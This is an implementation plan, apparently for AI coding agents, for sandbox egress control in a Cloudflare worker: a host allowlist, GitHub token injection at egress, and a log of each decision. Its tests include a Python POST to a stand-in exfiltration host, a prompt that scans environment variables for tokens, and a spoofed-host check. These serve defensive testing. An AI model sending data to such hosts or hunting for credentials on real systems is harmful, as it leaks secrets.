# Sandbox 出口管控 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 模型寫的 Python 在 Sandbox 裡跑時，所有對外 HTTP(S) 都經過 Worker 的出口處理器：白名單外的網址被擋下並記錄；呼叫 GitHub API 時 token 在出口才補上，container 裡的程式碼完全看不到 token。聊天畫面顯示每次執行的「出口紀錄」（投影片第 43–44 張）。

**Architecture:** 升級 `workers/chat-sandbox` 的 `@cloudflare/sandbox` 到支援 outbound handler 的版本（Dockerfile 的 base image 同步換成相同版本的 `-python` tag）。把 Durable Object class 改成 `export class Sandbox extends BaseSandbox { interceptHttps = true }`（**class 名稱維持 `Sandbox`**，不改 wrangler 的 DO binding / migrations），並 export SDK 要求的 `ContainerProxy`。出口政策寫成純函式 `decideEgress()` 放 `src/lib/sandbox-egress.ts`（App 與 Worker 共用、可測），Worker 用 `Sandbox.outbound`（catch-all）套用：允許 → `fetch`；GitHub → 在 HTTPS 請求補 `Authorization` 再 `fetch`；其他 → 回 403 並記錄。每筆決定寫進 KV（依 container 分組、TTL 1 小時），`/api/execute` 回傳這次執行期間的紀錄；App 的 `executeCode` 工具結果帶 `egress`，聊天的工具卡片顯示。

**Tech Stack:** Cloudflare Sandbox SDK（outbound handlers、`interceptHttps`）、Containers、KV、vitest。

**Spec:** 投影片第 43–44 張與官方文件 `developers.cloudflare.com/sandbox/sdk/guides/outbound-traffic/`、`/containers/configuration/outbound-traffic/`（`outbound` / `outboundByHost`、`interceptHttps`、`allowedHosts`、`ctx.containerId`）。

## Global Constraints

- 回覆一律繁體中文；程式註解英文、照現有風格。
- **不要** `git push`、**不要**任何 `wrangler deploy`（包含 chat-sandbox）、**不要** `wrangler secret put`、不要動 Dashboard。只在本地實作、測試、commit 到自己的分支。
- 不要 commit `.dev.vars`；不要印出任何 token。
- 測試放 `src/**/*.test.ts`；`workers/chat-sandbox` 以相對路徑 import `src/lib/sandbox-egress.ts`（同 `workers/approval-workflow` 的做法）。注意 `workers/chat-sandbox` 有自己的 `package.json` / `node_modules`，升級 SDK 在那個目錄做。
- 完成前執行：`npx vitest run`（全綠）、root 的 `npx tsc --noEmit -p .`（只允許既有的 `workers/openclaw-sandbox` / `openclaw-instances` / `save-to-r2` / `crawler-endpoint` 錯誤）、`workers/chat-sandbox` 內 `npx tsc --noEmit`。
- 修改 `agents.md`：在第 6 節 Sandbox 段落或新增小節記錄出口管控。

## Decisions

1. **政策（預設拒絕）**：

   | Host | 動作 |
   |------|------|
   | `api.github.com` | 允許 + **補 token**（只在 HTTPS 時加 `Authorization: Bearer ${env.GITHUB_TOKEN}`；沒有 secret 時照樣放行但記錄 `token: false`） |
   | `github.com`、`raw.githubusercontent.com`、`objects.githubusercontent.com` | 允許（不補 token） |
   | `pypi.org`、`files.pythonhosted.org` | 允許（pip install 用） |
   | 其他 | 擋下，回 `403 text/plain`：`Blocked by sandbox egress policy: {host}` |

   政策是常數陣列，支援 `*.example.com` 萬用字元；不要做成可由模型或使用者修改。
2. **記錄格式** `EgressEvent = { at: number; method: string; host: string; path: string; action: 'allowed' | 'injected' | 'blocked'; status?: number }`，path 去掉 query string、截 120 字；**絕不記錄 header 或 body**。
3. **紀錄位置**：KV `chat-sandbox:egress:{containerId}`，JSON 陣列最多 50 筆、TTL 3600 秒。`/api/execute` 在執行前記下時間，執行後讀取同一個 container 的紀錄、只回傳 `at >= start` 的部分。`containerId` 與 sandbox 的對應：先在本地 / 型別定義確認 `ctx.containerId` 是什麼（DO id 字串？），用 `env.Sandbox.idFromName(resolvedId).toString()` 或 SDK 提供的方法算出同一個 key，結論寫進 ledger。
4. **證明程式看不到 token**：container 的環境變數、檔案系統都不放 token；system prompt 的 sandbox 段落加一句「沙箱對外網路有白名單；呼叫 api.github.com 不需要也拿不到 token，出口會自動補上」。
5. **UI**：`executeCode` 的工具卡片在有 `egress` 時顯示「出口紀錄」小表：允許（灰）、補上憑證（綠，🔑）、擋下（紅，🛡）。不顯示任何 token 內容。
6. **範例題目**（首頁 Sandbox 類別新增 2–3 題，雙語）：
   - 「用 Python 呼叫 GitHub API 查 `cloudflare/workers-sdk` 最新的 release，並印出 `/rate_limit` 的 limit；再印出所有環境變數裡有沒有 GITHUB 或 TOKEN 字樣」——預期 limit 5000（有補 token）且環境變數裡找不到。
   - 「用 Python 把一段測試資料 POST 到 `https://exfil.example.net/collect`」——預期被擋，出口紀錄顯示 🛡。
   - （選填）「`pip install` 一個小套件再 import」——預期允許。

## Review Focus

- 升級 SDK 後既有功能不能壞：`/api/execute`（Python / JS、matplotlib 圖片）、`/api/preview`（`exposePort` 預覽網址）、`/api/upload`、warmup、idle reaper、`proxyToSandbox`。
- `interceptHttps` 之後 Python `requests` / `urllib` / `pip` 是否信任 SDK 注入的 CA（文件說 runtime 會盡量自動設定；若 pip 不信任，在 Dockerfile 設 `PIP_CERT` / `REQUESTS_CA_BUNDLE` 指向 `/etc/cloudflare/certs/cloudflare-containers-ca.crt`，以實測為準）。
- `exposePort` 的預覽網址（inbound）不受 outbound 政策影響。
- 補 token 只對 `https:`；`http://api.github.com` 不補（文件警告明文 HTTP 會外洩）。
- KV 寫入失敗不能讓請求失敗（try/catch，記 console.error）。

---

### Task 1: 出口政策純函式

**Files:**
- Create: `src/lib/sandbox-egress.ts`
- Test: `src/lib/sandbox-egress.test.ts`

**Interfaces — Produces:**
- `type EgressAction = 'allowed' | 'injected' | 'blocked'`
- `interface EgressEvent { at: number; method: string; host: string; path: string; action: EgressAction; status?: number }`
- `decideEgress(url: string): { action: EgressAction; host: string }`（`injected` 只會出現在 `https://api.github.com/...`）
- `toEgressEvent(request: { method: string; url: string }, action: EgressAction, status: number | undefined, at: number): EgressEvent`（path 去 query、截 120）
- `appendEgress(list: EgressEvent[] | null, e: EgressEvent, max = 50): EgressEvent[]`
- `EGRESS_ALLOWLIST`（常數，供 UI / 文件引用）

- [ ] 失敗測試：`https://api.github.com/repos/x` → injected；`http://api.github.com/x` → allowed（不補）；`https://pypi.org/simple/` → allowed；`https://files.pythonhosted.org/...` → allowed；`https://exfil.example.net/collect` → blocked；`https://evil.com.github.com.attacker.io` → blocked（萬用字元比對要錨定結尾）；大小寫 host；`toEgressEvent` 不含 query；`appendEgress` 只留最新 50 筆。
- [ ] 實作、測試綠、commit `feat(sandbox): egress policy`。

### Task 2: 升級 Sandbox SDK 並掛上出口處理器

**Files:**
- Modify: `workers/chat-sandbox/package.json`（`@cloudflare/sandbox` 升到支援 outbound 的版本；用 `npm view @cloudflare/sandbox versions` 選最新穩定版，並確認該版 `.d.ts` 有 `outbound` / `ContainerProxy` / `interceptHttps`）
- Modify: `workers/chat-sandbox/Dockerfile`（`FROM docker.io/cloudflare/sandbox:{同版本}-python`）
- Modify: `workers/chat-sandbox/src/index.ts`
- Modify: `workers/chat-sandbox/wrangler.toml` / `wrangler.dev.toml`（如 SDK 需要額外設定；`[vars]` 不放 token，註解寫明 secret `GITHUB_TOKEN`）

**行為：** `Sandbox.outbound = async (request, env, ctx) => { const d = decideEgress(request.url); ...; record(env, ctx.containerId, event) }`；blocked 回 403；injected 複製 request 加 header 後 `fetch`；allowed 直接 `fetch`；記錄 status。`/api/execute` 回傳 `egress: EgressEvent[]`。

- [ ] 先讀新版 SDK 的 CHANGELOG / 型別，記下 breaking changes 與因應方式（ledger）。
- [ ] 實作；`workers/chat-sandbox` 內 `npx tsc --noEmit` 通過。
- [ ] **本地驗證**（若本機有 Docker）：`cd workers/chat-sandbox && npx wrangler dev -c wrangler.dev.toml --port 8788`，用 `SANDBOX_API_SECRET`（`workers/chat-sandbox/.dev.vars`）呼叫 `/api/execute` 跑三段 Python：GitHub API（沒有本地 `GITHUB_TOKEN` 時看到 allowed / 未補 token 也可，記錄下來）、`requests.post('https://exfil.example.net/collect')`（應得 403 且 egress 有 blocked）、`os.environ` 搜尋 token（應無）。沒有 Docker 就在 ledger 寫明「未在容器內驗證」，改為只驗型別與單元測試。
- [ ] commit `feat(sandbox): outbound handler with allowlist and GitHub token injection`。

### Task 3: App 端顯示出口紀錄

**Files:**
- Modify: `src/lib/chat-sandbox.ts`（`executeCode` 回應型別加 `egress?: EgressEvent[]`，原樣往上傳）
- Modify: `src/lib/chat-tools.ts`（工具結果帶 `egress`）
- Modify: 顯示 `executeCode` 結果的元件（在 `src/app/pages/chat.tsx` 的 `ToolCallDisplay` 或 `src/app/components/chat/` 內找；新增 `egress-log.tsx` 小元件）
- Modify: `src/lib/system-prompt.ts` 的 sandbox Harness 段落（Decision 4 的一句話）
- Modify: `src/app/components/chat/suggestion-categories.tsx` 與 `src/i18n/{zh-TW,en}.json`（Decision 6 的範例題）
- Test: 為「出口紀錄摘要」寫一個純函式（例如 `summarizeEgress(events) → { allowed, injected, blocked }`）放 `src/lib/sandbox-egress.ts` 並測試

- [ ] 測試先失敗再通過；`npx vitest run` 全綠；root `tsc` 無新錯誤。
- [ ] 若本地 App + 本地 sandbox 都能跑，從聊天送一題範例題截圖確認卡片顯示（無法跑就寫明）。
- [ ] commit `feat(chat): show sandbox egress log on executeCode results`。

### Task 4: 文件

- [ ] `agents.md`：出口政策表、KV key、`GITHUB_TOKEN` secret（`npx wrangler secret put GITHUB_TOKEN -c workers/chat-sandbox/wrangler.toml`，fine-grained PAT、只需公開 repo 唯讀）、SDK / image 版本、**上線步驟**（部署 chat-sandbox 會重建 container image；由使用者決定時間）。
- [ ] commit `docs(sandbox): egress control`。

## 完成定義

- 全套 vitest 綠、兩處 tsc 無新錯誤。
- 最終回報列出：選用的 SDK 版本與 breaking changes、本地是否在容器內實測（結果）、使用者需要做的事（建立 GitHub PAT、`wrangler secret put`、部署 chat-sandbox）。
